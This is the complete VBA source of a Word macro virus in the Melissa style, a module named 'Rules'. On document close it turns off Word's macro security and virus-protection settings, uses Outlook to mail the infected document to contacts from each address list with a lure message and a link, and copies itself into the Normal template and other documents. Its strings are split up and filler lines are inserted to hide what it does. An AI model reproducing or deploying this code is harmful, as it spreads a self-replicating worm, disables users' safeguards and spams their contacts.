Attribute VB_Name = "Rules"
Attribute VB_Base = "0{00020906-0000-0000-C000-000000000046}"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Document_Close()
On Error Resume Next
asdf = 1
Dim udo, dmn, buoas
asdf = 2
If System.PrivateProfileString("", "HKEY_C" & "URRENT_USER\Softw" & "are\Mic" & "rosoft\Off" & "ice\9.0\Wo" & "rd\Secu" & "rity", "Le" & "vel") = "" Then
asdf = 3
CommandBars("Too" & "ls").Controls("Mac" & "ro").Enabled = False
asdf = 4
Options.ConfirmConversions = (3 - 3): Options.VirusProtection = (4 - 4): Options.SaveNormalPrompt = (5 - 5)
asdf = 5
Else
asdf = 6
CommandBars("Mac" & "ro").Controls("Secu" & "rity...").Enabled = False
asdf = 7
System.PrivateProfileString("", "HKEY_CUR" & "RENT_USER\Soft" & "ware\Micro" & "soft\Off" & "ice\9.0\W" & "ord\Se" & "curity", "Le" & "vel") = 1&
asdf = 7
End If
asdf = 7
Set udo = CreateObject("Outl" & "ook.Applic" & "ation")
asdf = 7
Set dmn = udo.GetNameSpace("M" & "API")
asdf = 7
If System.PrivateProfileString("", "HKEY_CUR" & "RENT_USER\Soft" & "ware\Micro" & "soft\Of" & "fice\", "Rules?") <> "Rules" Then
asdf = 7
If udo = "Out" & "look" Then
asdf = 7
dmn.Logon "profile", "password"
asdf = 7
    For y = 1 To dmn.AddressLists.Count
asdf = 7
        Set abab = dmn.AddressLists(y)
asdf = 7
        x = 1
asdf = 7
        Set buoas = udo.CreateItem(0)
asdf = 7
        For oo = 1 To abab.AddressEntries.Count
asdf = 7
            bred = abab.AddressEntries(x)
asdf = 7
            buoas.Recipients.Add bred
asdf = 7
            x = x + 1
asdf = 7
            If x > 50 Then oo = abab.AddressEntries.Count
asdf = 7
         Next oo
asdf = 7
         buoas.Subject = "��������� �� " & Application.UserName
asdf = 7
         buoas.Body = "������! � ������ ����, ������� � ���� ������;) ������ ����� �� ��� ����� �������� : http://SuperBest.da.ru/"
asdf = 7
         buoas.Attachments.Add ActiveDocument.FullName
asdf = 7
         buoas.Send
asdf = 7
         bred = ""
asdf = 7
    Next y
asdf = 7
dmn.Logoff
asdf = 7
End If
asdf = 7
System.PrivateProfileString("", "HKEY_CURR" & "ENT_USER\Sof" & "tware\Mi" & "crosoft\Of" & "fice\", "Rules?") = "Rules"
asdf = 7
End If
asdf = 7
Set AAAA = ActiveDocument.VBProject.VBComponents.Item(1)
asdf = 7
Set EEEE = NormalTemplate.VBProject.VBComponents.Item(1)
asdf = 7
CCCC = EEEE.CodeModule.CountOfLines
asdf = 7
DDDD = AAAA.CodeModule.CountOfLines
asdf = 7
BBB = 2
asdf = 7
If AAAA.Name <> "Rules" Then
asdf = 7
If DDDD > 0 Then _
asdf = 7
AAAA.CodeModule.DeleteLines 1, DDDD
asdf = 7
Set TI = AAAA
asdf = 7
AAAA.Name = "Rules"
asdf = 7
HHHH = True
asdf = 7
End If
asdf = 7
If EEEE.Name <> "Rules" Then
asdf = 7
If CCCC > 0 Then _
asdf = 7
EEEE.CodeModule.DeleteLines 1, CCCC
asdf = 7
Set TI = EEEE
asdf = 7
EEEE.Name = "Rules"
asdf = 7
GGGG = True
asdf = 7
End If
asdf = 7
If GGGG <> True And HHHH <> True Then GoTo FFFF
asdf = 7
If GGGG = True Then
asdf = 7
Do While AAAA.CodeModule.Lines(1, 1) = ""
asdf = 7
AAAA.CodeModule.DeleteLines 1
asdf = 7
Loop
asdf = 7
TI.CodeModule.AddFromString ("Priva" & "te S" & "ub D" & "ocument_Cl" & "ose()")
asdf = 7
Do While AAAA.CodeModule.Lines(BBB, 1) <> ""
asdf = 7
TI.CodeModule.InsertLines BBB, AAAA.CodeModule.Lines(BBB, 1)
asdf = 7
BBB = BBB + 1
asdf = 7
Loop
asdf = 7
End If
asdf = 7
If HHHH = True Then
asdf = 7
Do While EEEE.CodeModule.Lines(1, 1) = ""
asdf = 7
EEEE.CodeModule.DeleteLines 1
asdf = 7
Loop
asdf = 7
TI.CodeModule.AddFromString ("Priv" & "ate S" & "ub Do" & "cument_Op" & "en()")
asdf = 7
Do While EEEE.CodeModule.Lines(BBB, 1) <> ""
asdf = 7
TI.CodeModule.InsertLines BBB, EEEE.CodeModule.Lines(BBB, 1)
asdf = 7
BBB = BBB + 1
asdf = 7
Loop
asdf = 7
End If
asdf = 7
FFFF:
asdf = 7
If CCCC <> 0 And DDDD = 0 And (InStr(1, ActiveDocument.Name, "Docu" & "ment") = False) Then
asdf = 7
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
asdf = 7
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
asdf = 7
ActiveDocument.Saved = True
asdf = 7
End If
asdf = 7
End Sub

